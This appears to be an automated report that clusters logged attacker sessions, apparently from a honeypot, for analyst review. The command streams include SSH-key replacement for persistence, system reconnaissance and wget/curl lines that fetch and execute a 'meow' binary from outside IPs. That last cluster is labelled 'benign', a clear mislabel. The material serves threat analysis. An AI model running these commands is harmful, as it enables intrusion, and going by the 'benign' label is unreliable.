# Small-cluster inspection — sessions layer

_Captured 2026-06-01T23:14:27.729480+00:00_

- **Clustering:** hdbscan (mcs=5, ms=2, rescue=0.96, scalar_weight=0.05)
- **Corpus:** 4045 sessions · 24 clusters · 37 outliers · 33 rescued
- **Small clusters (size ∈ [3, 10]):** 8
- **Shard tally (3b):** 0 shard · 8 non-shard  →  shard_fraction = 0.0

> **Analyst go/no-go:** skim the clusters below. If more than a couple read as token-variant shredding (same script, trivial differences), it's a **no-go**. The shard tally is an aid, not the decision.

## cluster 20 — n=10 — 🟢 distinct

- intent: `reconnaissance` (share 1.0)  ·  modal_signature_share: 0.1  ·  nearest_large_centroid_cos: 0.992

| session_id | intent | signature | command stream |
|---|---|---|---|
| `64194724dd24` | reconnaissance | `e1947531` | cd ~; chattr -ia .ssh; lockr -ia .ssh cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4… |
| `92bd52a811c8` | reconnaissance | `44b22cfb` | cd ~; chattr -ia .ssh; lockr -ia .ssh cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4… |
| `a5efce6cad20` | reconnaissance | `860c091c` | cd ~; chattr -ia .ssh; lockr -ia .ssh cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4… |

_… 7 more member(s) not shown._

## cluster 14 — n=9 — 🟢 distinct

- intent: `reconnaissance` (share 1.0)  ·  modal_signature_share: 0.8889  ·  nearest_large_centroid_cos: 0.949

| session_id | intent | signature | command stream |
|---|---|---|---|
| `25b2684e1931` | reconnaissance | `f78bec7f` | /ip cloud print ifconfig uname -a cat /proc/cpuinfo ps \| grep '[Mm]iner' ps -ef \| grep '[Mm]iner' ls -la ~/.local/share/TelegramD… |
| `52f7f3389ce0` | reconnaissance | `f78bec7f` | /ip cloud print ifconfig uname -a cat /proc/cpuinfo ps \| grep '[Mm]iner' ps -ef \| grep '[Mm]iner' ls -la ~/.local/share/TelegramD… |
| `f794480d4b57` | reconnaissance | `f78bec7f` | /ip cloud print ifconfig uname -a cat /proc/cpuinfo ps \| grep '[Mm]iner' ps -ef \| grep '[Mm]iner' ls -la ~/.local/share/TelegramD… |

_… 6 more member(s) not shown._

## cluster 18 — n=9 — 🟢 distinct

- intent: `credential_access` (share 0.5556)  ·  modal_signature_share: 0.1111  ·  nearest_large_centroid_cos: 0.946

| session_id | intent | signature | command stream |
|---|---|---|---|
| `812c00c370e1` | credential_access | `20b240be` | cd ~; chattr -ia .ssh; lockr -ia .ssh cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4… |
| `bd024efccb11` | reconnaissance | `2a8f1f6d` | cd ~; chattr -ia .ssh; lockr -ia .ssh cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4… |
| `627507a0a5f1` | credential_access | `192fd2ee` | cd ~; chattr -ia .ssh; lockr -ia .ssh cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4… |

_… 6 more member(s) not shown._

## cluster 5 — n=7 — 🟢 distinct

- intent: `reconnaissance` (share 1.0)  ·  modal_signature_share: 1.0  ·  nearest_large_centroid_cos: 0.84

| session_id | intent | signature | command stream |
|---|---|---|---|
| `cd2d53b8a23f` | reconnaissance | `d9915914` | echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" \| sh cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps |
| `865df5165d6e` | reconnaissance | `d9915914` | echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" \| sh cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps |
| `96733fe731dc` | reconnaissance | `d9915914` | echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" \| sh cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps |

_… 4 more member(s) not shown._

## cluster 4 — n=6 — 🟢 distinct

- intent: `reconnaissance` (share 1.0)  ·  modal_signature_share: 0.1667  ·  nearest_large_centroid_cos: 0.894

| session_id | intent | signature | command stream |
|---|---|---|---|
| `628cd6cffa92` | reconnaissance | `8d67a4f9` | echo "bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778047355687742523" \| sh bash --help; ls /proc/1/;… |
| `ddc47bc7063b` | reconnaissance | `317b7822` | echo "bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778047356206990387" \| sh bash --help; ls /proc/1/;… |
| `763274873566` | reconnaissance | `8178ff97` | echo "bash --help; ls /proc/1/; cat /proc/1/mounts; cat /proc/cpuinfo; echo __1778058246224437498" \| sh bash --help; ls /proc/1/;… |

_… 3 more member(s) not shown._

## cluster 10 — n=6 — 🟢 distinct

- intent: `privilege_escalation` (share 1.0)  ·  modal_signature_share: 1.0  ·  nearest_large_centroid_cos: 0.957

| session_id | intent | signature | command stream |
|---|---|---|---|
| `72ae9874558f` | privilege_escalation | `474f1906` | cd ~; chattr -ia .ssh; lockr -ia .ssh |
| `7beab7a09eee` | privilege_escalation | `474f1906` | cd ~; chattr -ia .ssh; lockr -ia .ssh |
| `a91c8ab92d03` | privilege_escalation | `474f1906` | cd ~; chattr -ia .ssh; lockr -ia .ssh |

_… 3 more member(s) not shown._

## cluster 12 — n=6 — 🟢 distinct

- intent: `initial_access` (share 0.6667)  ·  modal_signature_share: 0.6667  ·  nearest_large_centroid_cos: 0.929

| session_id | intent | signature | command stream |
|---|---|---|---|
| `10f4c2a31687` | initial_access | `2bf71eca` | cd ~; chattr -ia .ssh; lockr -ia .ssh cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4… |
| `5c0e931a97ff` | privilege_escalation | `d195872c` | cd ~; chattr -ia .ssh; lockr -ia .ssh cat /proc/cpuinfo \| grep name \| wc -l |
| `90966e4c8caf` | initial_access | `2bf71eca` | cd ~; chattr -ia .ssh; lockr -ia .ssh cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4… |

_… 3 more member(s) not shown._

## cluster 3 — n=5 — 🟢 distinct

- intent: `benign` (share 1.0)  ·  modal_signature_share: 0.2  ·  nearest_large_centroid_cos: 0.839

| session_id | intent | signature | command stream |
|---|---|---|---|
| `b172dbe78df5` | benign | `64c0aeab` | cd /tmp; ulimit -n 1020000; rm -rf meow*; wget http://35.231.74.47/meow; curl -O http://35.231.74.47/meow; chmod 777 meow; ./meow… |
| `fa77b636c21c` | benign | `90a86949` | echo '111111' \| sudo -S sh -c 'cd /tmp; ulimit -n 1020000; rm -rf meow*; wget http://34.11.136.102/meow; curl -O http://34.11.136… |
| `9c02ec2ae35b` | benign | `34681af5` | whoami echo 'password' \| sudo -S sh -c 'cd /tmp; ulimit -n 1020000; rm -rf meow*; wget http://35.237.91.38/meow; curl -O http://3… |

_… 2 more member(s) not shown._
